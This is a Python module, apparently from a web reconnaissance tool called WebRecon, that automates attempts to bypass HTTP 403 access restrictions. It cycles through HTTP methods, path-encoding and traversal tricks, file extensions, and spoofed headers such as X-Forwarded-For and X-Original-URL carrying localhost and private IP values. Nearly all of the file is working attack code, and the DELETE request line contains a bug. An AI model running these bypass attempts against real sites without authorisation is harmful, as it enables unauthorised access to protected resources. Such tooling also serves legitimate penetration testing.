import collections
import copy
import time
import requests
from urllib3.exceptions import HTTPError

from .base_scanner import Scanner
from .utils import *
from typing import Any, Dict, List, Tuple


#   --------------------------------------------------------------------------------------------------------------------
#
#   Attempt to bypass 403 using different methods
#
#   Ⓒ                                                                                                                Ⓒ
#   Ⓒ    This module was written in Python in order to integrate better with WebRecon, most methods were taken from  Ⓒ
#   Ⓒ    from this repo     ->      https://github.com/iamj0ker/bypass-403                                           Ⓒ
#   Ⓒ    and this repo      ->      https://github.com/yunemse48/403bypasser                                         Ⓒ
#   Ⓒ                                                                                                                Ⓒ
#
#   --------------------------------------------------------------------------------------------------------------------


class Bypass403(Scanner):
    SCAN_NICKNAME = ScannerNames.BypassScan
    _SCAN_COLOR = OutputColors.Blue
    _WRITE_RESULTS = False
    _SUPPORTS_CACHE = False
    _FOUND = 0

    _HOST_HEADERS = ["X-Custom-IP-Authorization", "X-Forwarded-For",
                     "X-Forward-For", "X-Remote-IP", "X-Originating-IP",
                     "X-Remote-Addr", "X-Client-IP", "X-Real-IP",
                     "X-Host"]

    _LHOST_NICKNAMES = ["localhost", "localhost:80", "localhost:443",
                        "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443",
                        "2130706433", "0x7F000001", "0177.0000.0000.0001",
                        "0", "127.1", "10.0.0.0", "10.0.0.1", "172.16.0.0",
                        "172.16.0.1", "192.168.1.0", "192.168.1.1"]

    def __init__(self, target_keyword, *args, **kwargs):
        self.target_keyword = target_keyword.strip("/")

        super().__init__(*args, **kwargs)
        self.target_url = self.target_url.strip("/")

    def try_bypass(self) -> dict:
        results = collections.defaultdict(list)

        # methods

        req_path = f"{self.target_url}/{self.target_keyword}"
        scode, size = self.send_request("GET", req_path)
        results[scode].append(f"GET {req_path}\tsize {size}")

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"Content-Length": "0"}
        scode, size = self.send_request("POST", req_path, headers=headers)
        results[scode].append(f"POST {req_path} -H 'Content-Length: 0'\tsize {size}")

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"Content-Length": "0"}
        scode, size = self.send_request("PUT", req_path, headers=headers)
        results[scode].append(f"PUT {req_path} -H 'Content-Length: 0'\tsize {size}")

        req_path = f"{self.target_url}/{self.target_keyword}"
        scode, size = self.send_request("TRACE", req_path)
        results[scode].append(f"TRACE {req_path}\tsize {size}")

        req_path = f"{self.target_url}/{self.target_keyword}"
        scode, size = self.send_request("TRACE", req_path)
        results[self.send_request("DELETE", req_path)].append(f"DELETE {req_path}\tsize {size}")

        # encoding / path traversal

        for req_path in [f"{self.target_url}/%2e/{self.target_keyword}", f"{self.target_url}/{self.target_keyword}/.",
                         f"{self.target_url}//{self.target_keyword}//", f"{self.target_url}/./{self.target_keyword}/./",
                         f"{self.target_url}/{self.target_keyword}..;/", f"{self.target_url}/{self.target_keyword};/",
                         f"{self.target_url}/{self.target_keyword}%20", f"{self.target_url}/{self.target_keyword}%09",
                         f"{self.target_url}/{self.target_keyword}?", f"{self.target_url}/{self.target_keyword}#",
                         f"{self.target_url}/{self.target_keyword}/*"]:
            scode, size = self.send_request("GET", req_path)
            results[scode].append(f"GET {req_path}\tsize {size}")

        # file extensions

        for file_ext in ["html", "php", "json"]:
            req_path = f"{self.target_url}/{self.target_keyword}.{file_ext}"
            scode, size = self.send_request("GET", req_path)
            results[scode].append(f"GET {req_path}\tsize {size}")

        # headers

        for header in Bypass403._HOST_HEADERS:
            for host_nickname in Bypass403._LHOST_NICKNAMES:
                req_path = f"{self.target_url}/{self.target_keyword}"
                headers = {header: host_nickname}
                scode, size = self.send_request("GET", req_path, headers=headers)
                results[scode].append(f"GET {req_path} -H {header}: {host_nickname}\tsize {size}")

        req_path = f"{self.target_url}"
        headers = {"X-rewrite-url": self.target_keyword}
        scode, size = self.send_request("GET", req_path, headers=headers)
        results[scode].append(f"GET {req_path} -H 'X-rewrite-url: {self.target_keyword}'\tsize {size}")

        req_path = f"{self.target_url}"
        headers = {"X-Original-URL": self.target_keyword}
        scode, size = self.send_request("GET", req_path, headers=headers)
        results[scode].append(f"GET {req_path} -H 'X-Original-URL: {self.target_keyword}'\tsize {size}")

        return results

    def send_request(self, method, path, headers=None) -> Tuple[int, int]:  # returns status_code, size
        time.sleep(0.25 * self.request_cooldown)
        try:
            response = self._make_request(method=method, url=path, headers=headers,
                                          allow_redirects=True)
        except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout,
                requests.exceptions.ReadTimeout, HTTPError):
            return 0, 0
        except requests.exceptions.TooManyRedirects:
            self._log_exception(requests.exceptions.TooManyRedirects.__name__, abort=False)
            return ScannerDefaultParams.TooManyRedirectsSCode, 0
        except Exception as exc:
            return 0, 0
        return response.status_code, len(response.text)

    def _start_scanner(self, results_filename=None) -> Dict[int, List[str]]:
        success_results = dict()
        self._log_status(OutputStatusKeys.State, OutputValues.StateRunning)
        all_results = self.try_bypass()

        success = False
        for scode in ScannerDefaultParams.SuccessStatusCodes:
            success_results[scode] = copy.deepcopy(all_results[scode])
            if len(all_results[scode]):
                success = True
        if success:
            self._log_progress(f"success -> {self.target_keyword}")
            Bypass403._FOUND += 1
        else:
            self._log_progress(f"failed -> {self.target_keyword}")
        self._log_status(OutputStatusKeys.Found, Bypass403._FOUND)

        return success_results

    def _define_status_output(self) -> Dict[str, Any]:
        status = super()._define_status_output()
        status[OutputStatusKeys.Current] = f"{self.target_url}/{self.target_keyword}"
        status[OutputStatusKeys.Found] = Bypass403._FOUND

        return status


if __name__ == "__main__":
    pass
